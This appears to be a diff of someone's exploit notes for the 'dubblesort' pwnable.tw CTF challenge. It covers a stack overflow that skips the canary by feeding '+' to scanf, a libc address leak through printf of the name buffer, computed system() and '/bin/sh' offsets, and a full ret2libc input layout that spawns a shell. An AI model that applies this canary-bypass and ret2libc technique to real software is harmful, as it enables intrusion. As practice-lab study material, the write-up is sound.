@@ -84,19 +84,19 @@ LAB_000109a9:
 
             High 
             ┌─────────────────┐
-0xffffcc5c  | return address  | [4 bytes]
+            | return address  | [4 bytes]
             ├─────────────────┤
-0xffffcc58  | frame pointer   | [4 bytes]
+            | frame pointer   | [4 bytes]
             ├─────────────────┤
-0xffffcc40  | saved regs/etc  | [24 bytes]
+            | saved regs/etc  | [24 bytes]
             ├─────────────────┤
-0xffffcc3c  | canary          | [4 bytes] 
+            | canary          | [4 bytes] 
             ├─────────────────┤
-0xffffcbfc  | local_54        | [64 bytes]    Name
+            | local_54        | [64 bytes]    Name
             ├─────────────────┤
-0xffffcbdc  | local_74        | [24 bytes]    Numbers List
+            | local_74        | [32 bytes]    Numbers List
             ├─────────────────┤
-0xffffcbd8  | local_78        | [4 bytes]     Total amount of numbers to sort = len(local_74)
+            | local_78        | [4 bytes]     Total amount of numbers to sort = len(local_74)
             ├─────────────────┤
             | ...             | Unknown vars & function args 
             └─────────────────┘
@@ -116,7 +116,6 @@ return address and stack canary this will also be sorted.
 33 numbers to "sort" will fully overwrite the return address. This is an offset of (33 * 4 bytes)
 The overwritten values should be strategic. Because all the values including the return address will be sorted it will 
 mean that everything before the canary should be less than it, and everything above the canary should be greater than it.
-
 An input of + with scanf %d means that the original memory value will not affected. Therefore the stack canary does not have
 to be leaked. Rather using the correct offsets a + or other non digit input will leave the canary intact.
 
@@ -124,8 +123,42 @@ __printf_chk of name can be leveraged as info leak. Because there is existing ga
 to gracefully overwrite only parts of memory will mean that additional info can be leaked in the print.
 A name input of 20 bytes will leak the 4 bytes at 0xffffcc10. This value 0xf7...... is a libc value
 
-0xffffcbfc:     0x00000008
-0xffffcc00:     0x00000009      0x0000000a      0x00000000      0xffffdfad
-0xffffcc10:     0xf7fc4580      0xf7fc4000
+0xf7e19000 0xf7fc9000 0x00000000 r-x /home/sheehyun/dev/Hacking/CTFs/pwnable.tw/dubblesort_challenge/libc-2.23.so
+0xf7fc9000 0xf7fca000 0x001b0000 --- /home/sheehyun/dev/Hacking/CTFs/pwnable.tw/dubblesort_challenge/libc-2.23.so
+0xf7fca000 0xf7fcc000 0x001b0000 r-- /home/sheehyun/dev/Hacking/CTFs/pwnable.tw/dubblesort_challenge/libc-2.23.so
+0xf7fcc000 0xf7fcd000 0x001b2000 rw- /home/sheehyun/dev/Hacking/CTFs/pwnable.tw/dubblesort_challenge/libc-2.23.so
 
-Because all address we can write to will be sorted - a classic ROP chain cannot work. Instead ret2libc is the only option
+0xffffcbb0:     0x00000000      0xffffcebc      0xf7fcc000      0x41414141
+0xffffcbc0:     0x42424242      0x43434343      0x44444444      0x41414141
+0xffffcbd0:     0x42424242      0x43434343      0xf7fcc00a      0x56555601
+0xffffcbe0:     0x565557a9      0x56556fa0      0x00000001      0x56555b72
+
+libc library is from 0xf7e19000 - 0xf7fcc000
+0xf7fcc000 is located 28 bytes from the libc library
+the offset of this address is 0xf7fcc00a - 0xf7e19000 = 0x1b300a (this is offset from libc base addr)
+
+$ readelf -s libc-2.23.so | grep system
+  1457: 0003adb0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
+
+system_addr = libc_base + system_offset 
+            = (leak - 0x1b300a) + 0x3adb0
+
+$ strings libc.so.6 -tx | grep "/bin/sh"
+ 15bb2b /bin/sh
+
+/bin/sh addr = libc_base + 0x15bb2b
+
+input name:  AAAAAAAAAAAAAAAAAAAAAAAAAAAA
+input len:   35
+input 0-23:  0
+input 24:    +  
+input 25-27: system() > value > canary
+input 28:    ebx
+input 29:    esi
+input 30:    edi
+input 31:    ebp
+input 32:    system()
+input 33:    fake return addr
+input 34:    "/bin/sh" addr
+
+
